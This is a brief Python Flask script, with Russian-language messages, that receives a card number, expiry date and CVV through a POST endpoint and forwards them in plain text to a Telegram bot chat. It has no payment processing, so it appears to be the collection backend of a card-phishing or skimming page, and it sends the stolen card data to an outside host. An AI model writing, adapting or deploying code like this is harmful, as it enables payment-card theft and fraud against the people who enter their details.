from flask import Flask, request, jsonify
import json
import requests
from flask import Flask, request, jsonify
import json
import requests
from flask_cors import CORS
import os

app = Flask(__name__)


TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

@app.route('/send-telegram', methods=['POST'])
def send_telegram():
    try:
        data = request.get_json()
        if not data:
           return jsonify({'message': 'Данные не найдены в теле запроса'}), 400

        message = f"Номер карты: {data['cardNumber']}\nКарта годна до: {data['expiryDate']}\nCVV: {data['cvv']}"

        send_message_to_telegram(message)

        return jsonify({'message': 'Сообщение успешно отправлено'}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'message': 'Ошибка отправки данных'}), 500

def send_message_to_telegram(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
     }
     requests.post(url, json=payload)

if __name__ == '__main__':
    app.run(debug=True, port=10000,host='0.0.0.0')